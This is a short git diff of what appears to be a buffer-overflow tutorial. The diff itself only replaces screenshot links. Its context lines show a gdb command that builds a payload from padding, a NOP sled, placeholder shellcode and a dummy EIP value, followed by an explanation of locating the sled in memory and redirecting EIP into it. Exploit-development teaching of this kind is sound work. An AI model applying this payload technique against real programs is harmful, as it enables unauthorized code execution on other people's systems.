@@ -24,13 +24,14 @@ payload = padding + nops + tmp_shellcode + eip
 ```bash
 run $(python3 -c "import sys; offset = 267; nops = b'\x90' * 100; tmp_shellcode = b'\x33' * 100; padding = b'E' * (offset - len(nops) - len(tmp_shellcode)); eip = b'k' * 4; payload = padding + nops + tmp_shellcode + eip; sys.stdout.buffer.write(payload)")
 ```
-<img width="1274" height="84" alt="image" src="https://github.com/user-attachments/assets/510b3417-3bec-4428-bd27-40052ec73603" />
 
-<img width="1281" height="66" alt="image" src="https://github.com/user-attachments/assets/c408fa3c-0485-4990-8db1-51cc5b414d2e" />
+<img width="1274" height="84" alt="1" src="https://github.com/user-attachments/assets/fe769006-855b-4203-b38a-e9cca1a57cf1" />
+
 
 Now, once we reach our previous breakpoint (or the program crashes), we can examine the program’s memory to look for a return address using ```x/400xb $esp``` (Adjust depending on your case)
 
-<img width="783" height="676" alt="image" src="https://github.com/user-attachments/assets/afc0d116-cb8b-4587-8175-97a2c027a74a" />
+<img width="783" height="676" alt="2" src="https://github.com/user-attachments/assets/08763347-098f-4ca1-8ec2-c228a92cd235" />
+
 
 As can be seen, the NOPs start at 0xffffd0b0. The idea is to use the return address as the new value for EIP register to redirect the program to where our NOPS are in memory, causing the CPU slides into our shellcode and executing it. 
 
